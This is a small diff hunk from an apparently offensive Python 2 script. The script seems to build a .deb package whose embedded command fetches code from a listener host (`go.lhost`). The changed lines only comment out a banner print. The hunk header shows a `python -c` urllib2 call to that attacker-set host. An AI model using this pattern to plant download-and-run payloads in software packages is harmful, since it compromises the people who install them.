@@ -81,8 +81,8 @@ python -c "import urllib2; r = urllib2.urlopen('http://"""+str(go.lhost)+""":808
 		print "[-] please provide valid arguments [-]"
 		print ""	
 	
-	else:
-		print banner
+	#else:
+	#	print banner
 
 def make_deb():	
 	gen = """
